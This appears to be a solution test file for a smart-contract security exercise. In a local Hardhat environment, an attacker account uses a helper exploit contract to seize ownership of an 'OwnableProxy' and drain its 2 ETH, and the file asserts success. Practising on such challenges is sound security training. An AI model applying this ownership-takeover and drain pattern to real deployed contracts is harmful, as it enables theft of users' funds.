const { expect } = require('chai')
const { ethers } = require('hardhat')

describe('[OWNABLE PROXY EXPLOIT]', async function () {
    let deployer, attacker

    const INITIAL_BALANCE = ethers.utils.parseEther('2')

    before(async function () {
        // SET UP
        ;[deployer, attacker] = await ethers.getSigners()

        this.ownableProxy = await (
            await ethers.getContractFactory('OwnableProxy', deployer)
        ).deploy()

        await deployer.sendTransaction({ to: this.ownableProxy.address, value: INITIAL_BALANCE })

        expect(
            await ethers.provider.getBalance(this.ownableProxy.address)
        ).to.be.equal(INITIAL_BALANCE)
    })

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (await ethers.getContractFactory('OwnableProxyExploit_2', deployer)).deploy(this.ownableProxy.address)
        
        console.log(`Owner    : ${await this.ownableProxy.owner()}`)
        let balanceBefore = await ethers.provider.getBalance(attacker.address)

        await exploit.connect(attacker).run();
        await this.ownableProxy.connect(attacker).forward_call_with_value(attacker.address, [], INITIAL_BALANCE)

        let balanceAfter = await ethers.provider.getBalance(attacker.address)
        console.log(`New Owner: ${await this.ownableProxy.owner()}`)

        expect(balanceAfter).to.be.gt(balanceBefore)

    })

    after(async function () {
        // SUCCESS CONDITIONS
        expect(await this.ownableProxy.owner()).to.be.equal(attacker.address)
        expect(await ethers.provider.getBalance(this.ownableProxy.address)).to.be.equal('0')
    })
})
